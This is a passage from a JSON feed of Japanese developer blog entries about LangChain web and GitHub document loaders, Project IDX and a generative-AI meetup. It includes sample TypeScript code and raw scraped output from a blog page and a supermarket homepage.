speakerdeck.com↑私の資料はこちらにアップロードしています。様々な学びがあり、もっと生成AIを頑張ろう、と思えた刺激的なMeetupでした！","isoDate":"2024-09-02T13:41:06.000Z","dateMiliSeconds":1725284466000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChainでWebサイトの内容取得やGitHubソースコード取得","link":"https://speakerdeck.com/shukob/langchaindewebsaitononei-rong-qu-de-yagithubsosukodoqu-de","contentSnippet":"https://langchain.connpass.com/event/329185/\\r\\rLangChainでは、Webサイトの内容取得やGitHubソースコード取得もできます。\\r使用してみた所感も交えてこれらの機能のご紹介をします。","isoDate":"2024-09-02T04:00:00.000Z","dateMiliSeconds":1725249600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Project IDX での Web アプリケーション開発","link":"https://zenn.dev/satohjohn/articles/4e7a1e5e3140e1","contentSnippet":"概要Project IDX (以下 IDX) は Google Cloud の Cloud Workstations をベースに Google がホストする仮想実装環境を提供してくれるサービスになります。https://idx.dev/PWA 対応しているため、install して利用することが可能です。（私は、 https://open-vsx.org/extension/k--kato/intellij-idea-keybindings こちらの extensions を利用しているため keybind を考えると install したほうが扱いやすいというのがあります)...","isoDate":"2024-09-02T03:41:10.000Z","dateMiliSeconds":1725248470000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"LangChainでgithubリポジトリのソースコードを読む方法","link":"https://shu-kob.hateblo.jp/entry/2024/09/01/235529","contentSnippet":"shu-kob.hateblo.jp昨日の記事に関連して、今回はLangChainでgithubリポジトリのソースコードを読む方法です。github.com↑サンプルソースコードを載せています。js.langchain.com↑使い方はこちら実行例npx ts-node githubLoader.ts https://github.com/shu-kob/langchain-sample-codeDocument {  pageContent: \\"import { CheerioWebBaseLoader } from \'@langchain/community/document_loaders/web/cheerio\'\\\\n\\" +    \\"import { RecursiveCharacterTextSplitter } from \'@langchain/textsplitters\'\\\\n\\" +    \\"import { HtmlToTextTransformer } from \'@langchain/community/document_transformers/html_to_text\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function webLoad (url: string) {\\\\n\' +    \'  const loader = new CheerioWebBaseLoader(url)\\\\n\' +    \'  const docs = await loader.load()\\\\n\' +    \\"  const splitter = RecursiveCharacterTextSplitter.fromLanguage(\'html\')\\\\n\\" +    \'  const transformer = new HtmlToTextTransformer()\\\\n\' +    \'  const sequence = splitter.pipe(transformer)\\\\n\' +    \'  const newDocuments = await sequence.invoke(docs)\\\\n\' +    \\"  console.log(\'newDocuments:\')\\\\n\\" +    \'  console.log(newDocuments)\\\\n\' +    \'}\\\\n\' +    \'\\\\n\' +    \'webLoad(url)\\\\n\',  metadata: {    source: \'cheerioWebBaseLoader.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}Document {  pageContent: \\"import { GithubRepoLoader } from \'@langchain/community/document_loaders/web/github\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function readSorceCodesFromGithub(url: string) {\\\\n\' +    \'\\\\n\' +    \'  const loader = new GithubRepoLoader(\\\\n\' +    \'    url,\\\\n\' +    \'    {\\\\n\' +    \'      branch: \\"main\\", // Defaultブランチが \\"master\\" でないか注意。他のブランチも選択可能\\\\n\' +    \'      recursive: true,\\\\n\' +    \'      processSubmodules: true,\\\\n\' +    \'      unknown: \\"warn\\",\\\\n\' +    \'      maxConcurrency: 5, // Defaults to 2\\\\n\' +    \'      ignorePaths: [\\"*.json\\", \\"*.yaml\\", \\"*.yml\\", \\"*config*\\", \\"*.md\\", \\"Dockerfile\\", \\"*ignore\\", \\".eslintrc.js\\", \\"*.svg\\"] // 除外するファイルパス\\\\n\' +    \'    }\\\\n\' +    \'  );\\\\n\' +    \'\\\\n\' +    \'  for await (const doc of loader.loadAsStream()) {\\\\n\' +    \'    console.log(doc)\\\\n\' +    \'  }\\\\n\' +    \'};\\\\n\' +    \'\\\\n\' +    \'readSorceCodesFromGithub(url)\\\\n\',  metadata: {    source: \'githubLoader.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}Document {  pageContent: \\"import * as cheerio from \'cheerio\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function webLoad (url: string) {\\\\n\' +    \'  // HTMLの取得\\\\n\' +    \'  const response = await fetch(url)\\\\n\' +    \'  const htmlText = await response.text()\\\\n\' +    \'  const cheerioText = cheerio.load(htmlText)\\\\n\' +    \'\\\\n\' +    \'  // styleとscriptを除去\\\\n\' +    \\"  cheerioText(\'style\').remove()\\\\n\\" +    \\"  cheerioText(\'script\').remove()\\\\n\\" +    \'\\\\n\' +    \\"  const bodyContent: string = cheerioText(\'body\').text().replace(/\\\\\\\\s+/g, \'\')\\\\n\\" +    \'\\\\n\' +    \\"  console.log(\'bodyContent:\')\\\\n\\" +    \'  console.log(bodyContent)\\\\n\' +    \'  return bodyContent\\\\n\' +    \'}\\\\n\' +    \'\\\\n\' +    \'webLoad(url)\\\\n\',  metadata: {    source: \'webLoad.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}これらのソースコードをプロンプトに含めて、生成AIに投げます。例えば、GitHubリポジトリの仕様を聞くなどです。多くの場合、ソースコードの文量は多くなり、それなりのトークン数になるので、200万トークン対応のGemini-1.5などを使うのが良いでしょう。","isoDate":"2024-09-01T14:55:29.000Z","dateMiliSeconds":1725202529000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChainでURLからWebページの中身を読み込む方法","link":"https://shu-kob.hateblo.jp/entry/2024/08/31/223416","contentSnippet":"langchain.connpass.com今度、Langchain Meetup Tokyoで喋るので、「LangChainでURLからWebページの中身を読み込む方法」を準備中github.com↑ソースコードを上げておきました。npx ts-node cheerioWebBaseLoader.ts https://shu-kob.hateblo.jp/entry/2024/08/29/234143という形で実行し、以下の結果が得られます。newDocuments:[  Document {    pageContent: \'Toilを無くして徒然なるままに日暮し硯に向かひたい 読者になる Toilを無くして徒然なるままに日暮し硯に向かひたい\\\\n\' +      \'生成AIアプリケーション開発などを行うエンジニアのブログです。 2024-08-29 オライリーのAWS生成AI本 AWSではじめる生成AI\\\\n\' +      \'―RAGアプリケーション開発から、基盤モデルの微調整、マルチモーダルAI活用までを試して学ぶ作者:Chris Fregly,Antje\\\\n\' +      \'Barth,Shelbee EigenbrodeオライリージャパンAmazon そういや、オライリージャパンからAWSの生成AI本出てますね。\\\\n\' +      \'欲しいと思いながらも買うてない。 現状、自身の仕事のほとんどはGoogle cloudなので、AWS書籍どうしようかと思ってますが、\\\\n\' +      \'面白そうなら買うてみるしか！ 翻訳はAWS Japanの久富木 隆一さん。 AWSの中の人が翻訳しているので確かでしょうね！ shu-kob\\\\n\' +      \'2024-08-29 23:41 読者になる\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'shu-kob 2024-08-29 23:41 読者になる 広告を非表示にする 関連記事 2024-08-04 日本生成AIユーザ会\\\\n\' +      \'Geminiマルチモーダルプログラミング（ハンズオン）を2024年8月13日(… genai-users.connpass.com\\\\n\' +      \'このブログで何回か書いておりますが… 2024-07-20 Google Gemini 1.5／LlamaIndex／LangChain\\\\n\' +      \'人工知能プログラミング… 2024年7月15日に Googleの生成AIモデル Gemini1.5 に対応した技…\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'1.5／LlamaIndex／LangChain 人工知能プログラミング… 2024年7月15日に Googleの生成AIモデル Gemini1.5\\\\n\' +      \'に対応した技… 2024-06-07 Google Cloud Vertex AI Agent Builderの使い方\\\\n\' +      \'RAG(Retrieval-Augmented Generation) RAG（Retrieval Augmente… 2024-04-05\\\\n\' +      \'生成AIアプリケーション開発入門ハンズオン genai-users.connpass.com この記事は、日本生成AIユーザ会 #1 … 2023-12-17\\\\n\' +      \'生成AIについて学んだのでざっとアウトプット はじめに 3-shake Advent Calendar 2023シリーズ1、17日目の記… もっと読む\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'生成AIについて学んだのでざっとアウトプット はじめに 3-shake Advent Calendar 2023シリーズ1、17日目の記… もっと読む\\\\n\' +      \'コメントを書く \xab SRETT#10 ~ 夏のSRE祭り！アーカイブ動画… 「SREをはじめよう」(Becoming SRE邦訳)が… \xbb プロフィール\\\\n\' +      \'id:shu-kob 読者です 読者をやめる 読者になる 読者になる このブログについて 検索 リンク はてなブログ ブログをはじめる\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'このブログについて 検索 リンク はてなブログ ブログをはじめる 週刊はてなブログ はてなブログPro 最新記事 SRETT#10 ~\\\\n\' +      \'夏のSRE祭り！アーカイブ動画公開！ オライリーのAWS生成AI本 「SREをはじめよう」(Becoming SRE邦訳)が出版 Google Cloud\\\\n\' +      \'エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'Google Cloud エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス\\\\n\' +      \'後継者不足のCOBOLを生成AIに引き継ぎ 月別アーカイブ ▼ ▶ 2024 2024 / 8 2024 / 7 2024 / 6 2024 / 5\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'2024 / 6 2024 / 5 2024 / 4 2024 / 3 2024 / 2 ▼ ▶ 2023 2023 / 12\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'2023 / 12 はてなブログをはじめよう！ shu-kobさんは、はてなブログを使っています。あなたもはてなブログをはじめてみませんか？\\\\n\' +      \'はてなブログをはじめる（無料） はてなブログとは Toilを無くして徒然なるままに日暮し硯に向かひたい Powered by Hatena Blog |\\\\n\' +      \\"ブログを報告する if (typeof window.Hatena === \'undefined\') { window.Hatena = {}; } if\\\\n\\" +      \\"(!Hatena.hasOwnProperty(\'Star\')) { Hatena.Star = { VERSION: 2, }; } (function(d,\\\\n\\" +      \'s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id))\\\\n\' +      \'return; js = d.createElement(s); js.id = id; js.src =\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'VERSION: 2, }; } (function(d, s, id) { var js, fjs =\\\\n\' +      \'d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js =\\\\n\' +      \'d.createElement(s); js.id = id; js.src =\\\\n\' +      \'\\"//connect.facebook.net/ja_JP/sdk.js#xfbml=1&appId=719729204785177&version=v17.0\\";\\\\n\' +      \\"fjs.parentNode.insertBefore(js, fjs); }(document, \'script\', \'facebook-jssdk\'));\\\\n\\" +      \'引用をストックしました ストック一覧を見る 閉じる 引用するにはまずログインしてください ログイン 閉じる 引用をストックできませんでした。再度お試しください\\\\n\' +      \'閉じる 限定公開記事のため引用できません。\\\\n\' +      \'\\\\n\' +      \'読者です 読者をやめる 読者になる 読者になる Hatena.Diary.GlobalHeader.init()\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  }]npx  ts-node cheerioWebBaseLoader.ts https://www.gyomusuper.jp/ただし、例えば業務スーパーのホームページを読んだ際、余計なコードが多い。newDocuments:[  Document {    pageContent: \\"$(function() { $(\'.sale_bnr_close\').on(\'click\', function() {\\\\n\\" +      \\"$(\'.sale_bnr\').css(\'display\', \'none\'); }); }); /*onlineshopメニュー*/ .menu_ec:hover\\\\n\\" +      \'{ background:url(\\"./img/menu_ec_on.png\\") no-repeat left center #FFF; transition:\\\\n\' +      \'all .5s; } /*Gyomucaメニュー*/ .menu_gyomuca { display: inline-block; width: 260px;\\\\n\' +      \'height: 44px; text-align: center; text-decoration: none; line-height: 44px;\\\\n\' +      \'outline: none; background:url(\\"./img/menu_gyomuca.png\\") no-repeat left center;\\\\n\' +      \'text-indent:100%; white-space:nowrap; overflow:hidden; } .menu_gyomuca:hover {\\\\n\' +      \'background:url(\\"./img/menu_gyomuca_on.png\\") no-repeat left center #FFF;\\\\n\' +      \'transition: all .5s; } /*ここまで*/ .menu_gyomuca_on\\\\n\' +      \'{background:url(\\"./img/menu_gyomuca_on.png\\") no-repeat left center\\\\n\' +      \'#FFF;text-indent:100%;white-space:nowrap;overflow:hidden;display:\\\\n\' +      \'inline-block;width: 260px;height: 44px;line-height: 44px;}\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'left center #FFF;text-indent:100%;white-space:nowrap;overflow:hidden;display:\\\\n\' +      \'inline-block;width: 260px;height: 44px;line-height: 44px;}\\\\n\' +      \'お問い合わせ　｜　会社案内　｜　サイトポリシー　｜　個人情報の保護に関する基本方針 ホーム 商品紹介 ミラクルレシピ 特集一覧 安心安全の取り組み\\\\n\' +      \'業務スーパーとは Gyomuca お問い合わせ オンラインショップ FC加盟店募集 会社案内 日本語 / ENGLISH / 中文 .fc_com_link {\\\\n\' +      \'display: flex; margin-left: 40px; margin-top: 5px; } #side_menu ul.fc_com_link\\\\n\' +      \'li { width: auto; height: auto; } #side_menu ul.fc_com_link li:nth-of-type(1) {\\\\n\' +      \'margin-right: 10px; } #side_menu ul.fc_com_link li a { position: relative;\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'height: auto; } #side_menu ul.fc_com_link li:nth-of-type(1) { margin-right:\\\\n\' +      \'10px; } #side_menu ul.fc_com_link li a { position: relative; font-size: 12px;\\\\n\' +      \'color: #fff; font-weight: bold; text-shadow: 0px 0px 0.1px #fff; letter-spacing:\\\\n\' +      \'1px; padding:5px; } #side_menu ul.fc_com_link li a span { content: \\"\\"; display:\\\\n\' +      \'inline-block; width: 0; height: 0; border-style: solid; border-width: 5px 0 5px\\\\n\' +      \'8.7px; border-color: transparent transparent transparent #ffffff; padding-right:\\\\n\' +      \'8px; } #side_menu ul.fc_com_link li a:hover { background-color: #fff; color:\\\\n\' +      \'#00a55a; text-decoration: none; transition: all .5s; } #side_menu ul.fc_com_link\\\\n\' +      \'li a:hover span { border-color: transparent transparent transparent\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'#00a55a; text-decoration: none; transition: all .5s; } #side_menu ul.fc_com_link\\\\n\' +      \'li a:hover span { border-color: transparent transparent transparent #00a55a;\\\\n\' +      \'transition: all .5s; } /*FCページの時*/ #side_menu ul.fc_com_link li a.menu_fc2_on {\\\\n\' +      \'background-color: #fff; color: #00a55a; text-decoration: none; text-shadow: 0px\\\\n\' +      \'0px 0.1px #00a55a; } #side_menu ul.fc_com_link li a.menu_fc2_on span {\\\\n\' +      \'border-color: transparent transparent transparent #00a55a; } /*ここまで*/ .lang_box\\\\n\' +      \'{ margin-left: 42px; display: flex; } .lang_box span:nth-child(n + 2) {\\\\n\' +      \'margin-left: 8px; } .social_box { margin-left: 38px; display: flex; margin-top:\\\\n\' +      \'20px; padding-left: 5px; } .social_box p img { width: 100%; } .social_box\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'{ margin-left: 38px; display: flex; margin-top: 20px; padding-left: 5px; }\\\\n\' +      \'.social_box p img { width: 100%; } .social_box p:nth-of-type(1) { margin-right:\\\\n\' +      \'18px; } .social_box p { width: 35px; } @media screen and (min-width: 1024px) {\\\\n\' +      \'#side_menu .social_box { padding-bottom: 80px; } } // 指定日時を超えたらセールスライド・バナー非表示\\\\n\' +      \\"var now = new Date(); var end = new Date(\'2024/10/31 23:59:59\');\\\\n\\" +      \\"//（指定日時　時間は24h表記） if ( now > end ) { $(\'.sale_slide_top\').remove();\\\\n\\" +      \\"$(\'.sale_bnr\').remove(); }else{ // 保持時間を設定 30分後を取得 var min = new Date();\\\\n\\" +      \'min.setTime( min.getTime() + ( 30 * 60 * 1000 )); console.log(min);\\\\n\' +      `$(\'.sale_bnr\').css(\'display\',\'block\'); $.cookie(\\"sale_bnr\\") ==`,    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'var min = new Date(); min.setTime( min.getTime() + ( 30 * 60 * 1000 ));\\\\n\' +      `console.log(min); $(\'.sale_bnr\').css(\'display\',\'block\'); $.cookie(\\"sale_bnr\\") ==\\\\n` +      `\'on\'?$(\'.sale_bnr\').hide():$(\'.sale_bnr\').show(); $.cookie(\\"sale_bnr\\",\'on\',{\\\\n` +      \\"expires: min , path: \'/\' }); } // 指定日時を超えたらセールスライド・バナー非表示 var now = new Date();\\\\n\\" +      \\"var end = new Date(\'2024/8/31 23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) {\\\\n\\" +      \\"$(\'.sale_bnr_img img\').attr(\'src\',\'img/main_sale20240901.png\'); }\\\\n\\" +      \\"$(window).on(\'load\', function(){ $(\'#bakudan\').attr(\'data-lightbox\',\'info01\');\\\\n\\" +      \'}); // 指定日時を超えたらセールスライド・バナー非表示 var now = new Date(); var end = new\\\\n\' +      \\"Date(\'2024/8/31 23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) {\\\\n\\" +      \\"$(\'.bakudan_slide\').remove(); $(\'.sale_alide\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"指定日時を超えたらセールスライド・バナー非表示 var now = new Date(); var end = new Date(\'2024/8/31\\\\n\\" +      \\"23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) { $(\'.bakudan_slide\').remove();\\\\n\\" +      \\"$(\'.sale_alide img\').attr(\'src\',\'img/main_sale20240901.png\'); } NEW ITEM 新着商品 新着\\\\n\\" +      \'ホット＆スパイシーヌードル\\\\n\' +      \'ホットでスパイシーなインスタントヌードルです。スパイスをきかせたスープは、ピリッとした辛さの中にも旨みがあり、クセになります！熱湯をかけて粉末スープと調味オイルを加えるだけの簡単調理も魅力。鍋で煮込んでお好みの具材や、ご飯を入るアレンジもおすすめです。5袋入り。\\\\n\' +      \'詳しくはこちら 詳しくはこちら PICK UP!おすすめ商品 商品をもっと見る 新着 パルメザンチーズのリゾット\\\\n\' +      \'イタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！\\\\n\' +      \'詳しくはこちら\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'パルメザンチーズのリゾット\\\\n\' +      \'イタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！\\\\n\' +      \'詳しくはこちら パルメザンチーズ[要冷蔵] 詳しくはこちら PICK UP!おすすめレシピ レシピをもっと見る SPECIAL TOPICS 特集\\\\n\' +      \'特集をもっと見る SNS 公式Instagram・公式X（旧Twitter） Tweets\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'Tweets by GyomusuperOFCL 公式Instagram 公式X（旧Twitter）\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'公式Instagram 公式X（旧Twitter）\\\\n\' +      \'2024年8月30日台風10号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風10号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風10号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月19日フジテレビ「めざましテレビ」で紹介されました2024年8月16日（金）放送のフジテレビ「めざましテレビ」で、業務スーパーの商品が紹介されました。放送局：フジテレビ番組名：「めざましテレビ」放送日：2024年8月16日（金）めざましテレビ2024年8月16日台風7号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風7号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風7号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月15日【セール情報】9月1日（日）から「お買い得まみれ!!総力祭\\\\n\' +      \'日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭\\\\n\' +      \'日頃のご愛顧感謝セール」を開催いたします。国内関連工場のオリジナル商品や海外直輸入商品など、とにかくお得なアイテム盛りだくさん！全国の業務スーパーで皆さまのご来店を心よりお待ちしております。<セール期間>【第1弾】2024年9月1日（日）～9月30日（月）【第2弾】2024年10月1日（火）～10月31日（木）<セール対象店舗>全国の業務スーパー各店（※一部店舗を除く）セール特設ページはこちら2024年8月12日台風5号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風5号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業時間や休業のご確認につきましては、台風5号の影響による営業に関するお知らせをご確認ください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。\\\\n\' +      \'一覧を見る 『世界の本物』を直輸入！\\\\n\' +      \'業務スーパーには、世界の国々で現地の人々に愛されている『世界の本物』が盛りだくさん！めずらしいものから日本でもなじみのあるものまで、厳選したアイテムを、高品質＆ロープライスで取りそろえています！\\\\n\' +      \'安さの秘密 自慢の国内自社工場の『オリジナル』\\\\n\' +      \'国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！\\\\n\' +      \'安全・安心の秘密\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'自慢の国内自社工場の『オリジナル』\\\\n\' +      \'国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！\\\\n\' +      \'安全・安心の秘密\\\\n\' +      \'スポーツには不思議なチカラがあります。こども達の心や体を強くするとともに、アスリート達の真摯な姿は多くの人々に笑顔と感動を与え、夢に向かって挑戦することの大切さを教えてくれます。\\\\n\' +      \'神戸物産はヴィッセル神戸、横浜DeNAベイスターズ、神戸ストークスのオフィシャルスポンサーとして地域スポーツの発展を支援し、人々のくらしを応援します。\\\\n\' +      \'.detail_footer{display: none;} @media screen and (max-width: 767px){\\\\n\' +      \'.detail_footer{ display: block; position: fixed; bottom: 0; width: 100%;\\\\n\' +      \'z-index: 20; } .detail_footer_con{ display: flex; justify-content: space-around;\\\\n\' +      \'align-items: flex-start; max-width: 400px; width: 97%; margin: 0 auto; }\\\\n\' +      \'.detail_footer_con a{ text-decoration: none; color: #fff; } .footer_btn{\\\\n\' +      \'background-color: #13a555; padding: 10px; border-radius: 10px 10px 0 0; width:\\\\n\' +      \'32%; font-size: 11px; color: #fff; display: flex; flex-direction: column;\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'#13a555; padding: 10px; border-radius: 10px 10px 0 0; width: 32%; font-size:\\\\n\' +      \'11px; color: #fff; display: flex; flex-direction: column; justify-content:\\\\n\' +      \'center; align-items: center; height: 55px; } .footer_btn p{ margin: 0; }\\\\n\' +      \'.footer_btn img{ margin-bottom: 5px; } .shop_img{ width: 24%; } .bargain_img{\\\\n\' +      \'width: 23%; } .pro_img{ width: 21%; } .to_img{ width: 22%; } .re_img{ width:\\\\n\' +      \'25%; } .footer_x, .footer_insta{ width: 13%; border-radius: 40px; } .footer_x{\\\\n\' +      \'background-color: #000; padding: 13px; } .footer_insta{ background-color:\\\\n\' +      \'#ff0069; padding: 12px; } .footer_btn, .footer_x, .footer_insta{ box-shadow: 1px\\\\n\' +      \'1px 4px 0 rgba(0, 0, 0, .5); } } 店舗検索 特売情報 ホーム WEBチラシ 店舗案内 ミラクルレシピ 商品紹介 直輸入商品\\\\n\' +      \'国内自社工場商品 業務スーパーとは 安さの秘密 安全安心の取り組み\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'ホーム WEBチラシ 店舗案内 ミラクルレシピ 商品紹介 直輸入商品 国内自社工場商品 業務スーパーとは 安さの秘密 安全安心の取り組み 商品開発事前チェック\\\\n\' +      \'現地工場チェック 品質安全検査 商品検証 FC加盟店募集 業務スーパー5つの強み 業務スーパーの特徴 オープンまでのプロセス 体制について 契約概要・加盟条件\\\\n\' +      \'物件・商品のご提案募集 お問い合わせ　｜　会社案内　｜　サイトポリシー　｜　個人情報の保護に関する基本方針\\\\n\' +      \'〒675-0063兵庫県加古川市加古川町平野125番1 \xa92018-document.write(new Date().getFullYear());\\\\n\' +      \'Gyomu Super All Rights Reserved. footer small { display: block; text-align:\\\\n\' +      \'right; padding-right: 10px; margin: 0 3%; color: #fff; } @media (max-width:64em)\\\\n\' +      \'{ footer small { display: block; text-align: left; padding-right: 10px; margin:\\\\n\' +      \\"20px 4%!important; color: #fff; } } $(\'.main_img\\\\n\\" +      \\".swiper-slide\').click(function(){ var top_slide =\\\\n\\" +      \\"$(this).children(\'a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"20px 4%!important; color: #fff; } } $(\'.main_img\\\\n\\" +      \\".swiper-slide\').click(function(){ var top_slide =\\\\n\\" +      \\"$(this).children(\'a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_slide\', \'event_label\' : \'top_slide_\'+top_slide+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_slide\', {\'top_slide\' : top_slide}); }); $(\'.topics\').click(function() { var\\\\n\\" +      \\"page_url = $(\'.topics a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\'\\\\n\\" +      \\": \'topics_bnr\', \'event_label\' : \'topics_bnr_\'+page_url+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'topics_bnr\', {\'topics_bnr\' : page_url}); });\\\\n\\" +      \\"$(\'.top_recipe_bnr\').click(function(){ var top_recipe_bnr = $(\'.top_recipe_bnr\\\\n\\" +      \\"a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' : \'top_recipe_bnr\',\\\\n\\" +      \\"\'event_label\' : \'top_recipe_bnr_\'+top_recipe_bnr+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_recipe_bnr\', {\'top_recipe_bnr\' : top_recipe_bnr}); });\\\\n\\" +      \\"$(\'.gs_forum\').click(function(){ var gs_forum = $(\'.gs_forum .forumimg\\\\n\\" +      \\"img\').attr(\'src\'); gtag(\'event\', \'click\',\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'top_recipe_bnr\', {\'top_recipe_bnr\' : top_recipe_bnr}); });\\\\n\\" +      \\"$(\'.gs_forum\').click(function(){ var gs_forum = $(\'.gs_forum .forumimg\\\\n\\" +      \\"img\').attr(\'src\'); gtag(\'event\', \'click\', {\'event_category\' : \'gs_forum\',\\\\n\\" +      \\"\'event_label\' : \'gs_forum_\'+gs_forum+\'\'}); gtag(\'event\', \'gs_forum\', {\'gs_forum\'\\\\n\\" +      \\": gs_forum}); }); $(\'.information dt\').click(function(){ var news_title =\\\\n\\" +      \\"$(this).children(\'p\').text(); gtag(\'event\', \'click\', {\'event_category\' : \'news\',\\\\n\\" +      \\"\'event_label\' : \'news_\'+news_title+\'\'}); gtag(\'event\', \'news\', {\'news\' :\\\\n\\" +      \\"news_title}); }); $(\'.yasusa\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'yasusa_himitsu\', \'event_label\' : \'yasusa_himitsu\'});\\\\n\\" +      \\"gtag(\'event\', \'yasusa_himitsu\', {\'yasusa_himitsu\' : \'yasusa_himitsu\'}); });\\\\n\\" +      \\"$(\'.anzen\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'anzen_himitsu\', \'event_label\' : \'anzen_himitsu\'}); gtag(\'event\',\\\\n\\" +      \\"\'anzen_himitsu\', {\'anzen_himitsu\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  }, 